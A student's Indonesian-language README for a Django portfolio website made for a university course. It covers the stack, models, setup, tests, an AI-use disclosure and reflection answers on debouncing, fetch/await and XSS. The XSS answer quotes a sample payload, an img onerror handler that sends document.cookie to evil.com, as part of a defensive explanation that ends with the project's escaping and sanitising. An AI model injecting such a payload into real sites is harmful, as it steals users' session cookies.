# myportofolio

Nama: Wien Muhammad Hafizhurrohman
NPM: 2506624461
Kelas: PBP E

## Tentang Proyek

Ini adalah website portfolio pribadi yang dibikin buat tugas PBP. Isinya profil diri, pengalaman kerja/organisasi, proyek yang pernah dikerjain, tech stack yang dikuasai, sama riwayat pendidikan. Dibangun pakai Django 6.1, jadi semuanya server-side rendering pakai Django template, ga pake framework frontend macem React atau Vue.

## Tech Stack

- Django 6.1 (backend)
- SQLite3 (database waktu development)
- PostgreSQL (database waktu production, via psycopg2-binary)
- WhiteNoise (static files serving di production)
- Gunicorn (WSGI server buat deployment)
- python-dotenv (buat manage environment variable)

## Struktur Folder

```
myportofolio/
├── manage.py
├── requirements.txt
├── .env
├── .env.prod
├── myportofolio/          # project package (settings, urls, wsgi)
│   ├── settings.py
│   ├── urls.py
│   └── wsgi.py
├── main/                  # aplikasi utama
│   ├── models.py          # model: Experience, TechStack, Project, Education
│   ├── views.py           # 4 view functions buat 4 halaman
│   ├── urls.py            # URL routing
│   ├── admin.py
│   └── tests.py           # 13 unit test cases
├── templates/
│   ├── index.html         # halaman utama / profil
│   ├── experience.html    # timeline pengalaman
│   ├── technologies.html  # grid tech stack
│   └── projects.html      # daftar proyek
└── static/
    ├── css/style.css
    ├── js/app.js
    └── img/
```

## Model

Ada 4 model di aplikasi `main`:

- **Experience** — buat nyimpen pengalaman kerja/organisasi. Field-nya: title, description, category (internship, volunteer, part-time, full-time, freelance, organization), thumbnail, is_featured, started_at, ended_at.
- **TechStack** — teknologi yang dikuasai. Ada name (unique), category (BACKEND, DATABASE, API, FRONTEND, CLOUD, DEVOPS, AI_ML, LANGUAGE), sama icon_class buat icon devicon.
- **Project** — proyek portofolio. Ada title, slug (unique), role, description, thumbnail, project_url, is_featured, dan relasi many-to-many ke TechStack.
- **Education** — riwayat pendidikan. Field-nya title, started_at, ended_at, education_loc.

## Cara Setup

1. Clone repo ini
2. Buat virtual environment: `python -m venv venv`
3. Aktifkan venv:
   - Windows: `venv\Scripts\activate`
   - macOS/Linux: `source venv/bin/activate`
4. Install dependencies: `pip install -r requirements.txt`
5. Bikin file `.env` di root, isi: `PRODUCTION=False`
6. Jalankan migrasi: `python manage.py migrate`
7. (Opsional) Bikin superuser: `python manage.py createsuperuser`

## Menjalankan Server

```bash
python manage.py runserver
```

Buka `http://127.0.0.1:8000/`

Halaman yang ada:

- `/` — profil utama, featured project, experience ringkas, education, tech marquee
- `/experience/` — timeline pengalaman lengkap + filter kategori
- `/technologies/` — grid tech stack + filter
- `/projects/` — daftar proyek, ada pagination 6 item per halaman

## Unit Tests

Jalankan: `python manage.py test main`

Ada 13 test cases yang nge-cover 3 skenario utama buat tiap view:

1. URL bisa diakses dan pake template yang bener
2. Data dari model muncul di halaman HTML kalau ada data
3. Halaman nampilin pesan empty state kalau datanya kosong

Detailnya:

- MainViewTest (3 test) — ngecek `/` pake `index.html`, data semua model muncul, empty state
- ExperienceViewTest (3 test) — ngecek `/experience/` pake `experience.html`, data experience muncul, empty state
- TechnologiesViewTest (3 test) — ngecek `/technologies/` pake `technologies.html`, data tech stack muncul, empty state
- ProjectsViewTest (3 test) — ngecek `/projects/` pake `projects.html`, data project muncul, empty state
- NonexistentPageTest (1 test) — ngecek URL yang ga ada balik 404

## Fitur

- Responsive — layout nya ngikutin ukuran layar
- Dark Mode — ada tombol switch buat ganti mode terang/gelap (di app.js)
- Parallax Clouds — efek parallax di section hero pake layer awan
- Category Filtering — bisa filter experience dan tech stack berdasarkan kategori
- Pagination — navigasi halaman di daftar proyek
- Featured Items — ada penanda khusus buat project dan experience yang unggulan
- Admin Panel — bisa akses `/admin/` buat manage data lewat Django admin

---

## AI Disclosure

### Tools yang Dipake

Selama pengembangan proyek ini, saya pakai **Gemini** (Google AI) buat bantu debugging dan eksplorasi konsep, terutama di bagian CSS.

AI tidak saya pakai buat ngehasilin seluruh aplikasi dari nol. Implementasi utama — mulai dari bikin model, nulis view, nulis template, sampe nulis test — saya kerjain sendiri. AI cuma saya pakai kalau saya udah stuck di masalah tertentu dan saya udah coba debug sendiri dulu.

### Strategi Prompting

Untuk tugas 5 ini saya sebenarnya tidak terlalu bergantung AI karena setelah tutorial 5, banyak checkbox di tugas 5 sudah kelar jadi saya cuman finishing yg gaada di tutorial 5.

Tolong rapihkan jawaban saya ke dalam bentuk read.me yang rapih (sayya memberi input jawaban tugas refleksi menurut pemahamana saya lalu AI mmemberi tambahan dan sekaligus merapihkan)

### Tugas Refleksi

#### 1. Debouncing pada Pencarian AJAX

**Debouncing** adalah teknik menunda eksekusi sebuah fungsi sampai user berhenti melakukan aksi tertentu selama jangka waktu tertentu. Daripada fungsi dipanggil di setiap event, timer di-reset tiap kali event baru datang, jadi fungsi cuma jalan sekali setelah jeda terakhir — di proyek ini jeda-nya 300 ms (`SEARCH_DEBOUNCE_DELAY` di `projects.html`).

Teknik ini penting buat pencarian AJAX karena:

- **Mengurangi jumlah request ke server.** Kalau user ngetik "portfolio website" (20 chars), tanpa debounce bisa terkirim ~20 request cuma buat 1 kata pencarian. Dengan debounce cuma 1 request setelah user berhenti ngetik.
- **Menghemat beban server dan bandwidth.** Tiap request AJAX itu query ke database (`filter(title__icontains=...)`) plus serialisasi JSON. Request yang menumpuk bikin server kerja doang buat data yang langsung dibuang.
- **Mencegah race condition / hasil saling tabrak.** Kalau request dikirim berurutan dan responsenya datang nggak berurutan (request lama balik lebih lambat), list bisa ketimpa sama data hasil pencarian lama. Selain debounce, di `fetchProjects()` juga ada `AbortController` buat membatalkan request sebelumnya.
- **Respons lebih smooth.** User nggak lihat list kedip-kedip berganti tiap huruf; list baru muncul setelah input stabil.

#### 2. Fungsi `await` pada `fetch()`

`fetch()` itu **asinkron**: dia langsung balikin objek `Promise` dan nggak nunggu respons server selesai. `await` bikin eksekusi fungsi `async` berhenti di titik itu sampai Promise-nya selesai (resolved), lalu nilai hasil responsnya diambil dan dipakai di baris berikutnya.

```js
const response = await fetch(url);          // berhenti sampai server jawab
const projectData = await response.json();  // berhenti sampai body terurai jadi JSON
```

Kalau `await` nggak dipakai, `response` akan berisi **Promise**, bukan objek Respons:

- `response.ok` → `undefined` (bukan `true`/`false`), jadi `if (!response.ok)` jadi salah baca.
- `response.json()` → bakal error / balikin Promise lagi, jadi `projectData` bukan array melainkan objek Promise.
- Kode setelah fetch jalan **sebelum data sampai** → `projectData.length === 0` bakal `undefined` sehingga selalu dianggap kosong, list nggak pernah ke-render, dan error-nya muncul di console sebagai "cannot read property of undefined".

Intinya: tanpa `await`, kita pegang "janji" hasilnya, bukan hasilnya sendiri, sehingga urutan baca data jadi kacau.

#### 3. Serangan XSS dan Kenapa Data AJAX Lebih Rentan

**XSS (Cross-Site Scripting)** adalah serangan menyisipkan skrip berbahaya (biasanya JavaScript) ke dalam halaman web lewat input user yang nggak dibersihkan, lalu dijalankan di browser korban dengan sesi/cookie-nya. Contohnya user nyisipin `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">` ke deskripsi proyek; kalau dipasang mentah-mentah ke DOM, skripnya jalan dan cookie session bisa kecuri.

Data yang dirender lewat AJAX/JavaScript **lebih rentan** daripada lewat template Django karena:

- **Django template auto-escape bawaan.** Semua `{{ variable }}` otomatis di-escape jadi `&lt;script&gt;` sehingga tag nggak pernah jadi HTML. Escape ini terjadi di server, nggak bisa dilupakan.
- **`innerHTML` nggak punya proteksi otomatis.** Kalau JavaScript nyisipin string dari JSON respons fetch pakai `innerHTML = ...`, browser langsung nge-parse string itu sebagai HTML. Satu field yang lolos aja udah cukup buat XSS.
- **Datanya datang dari endpoint JSON yang berbeda.** Prosesnya dua tahap: server nge-serialize data → JavaScript nge-render ulang. Titik escape-nya pindah ke tangan JavaScript, jadi kewaspadaannya harus manual di tiap sisipan (`escapeHtml()` di `projects.html`) bukan otomatis kayak template.
- **Isi JSON sering dianggap "aman".** Karena respons JSON bukan halaman HTML, developer kadang lupa bahwa isinya tetap data user yang belum tentu bersih.

Makanya pertahanannya dua lapis di proyek ini: **client-side** pakai `escapeHtml()` sebelum semua nilai dimasukkan ke template literal HTML (dan `textContent` buat toast), plus **server-side** pakai `strip_tags()` di `clean_title`, `clean_role`, dan `clean_description` pada `ProjectForm` supaya tag HTML dibersihkan sebelum kesimpen di database.


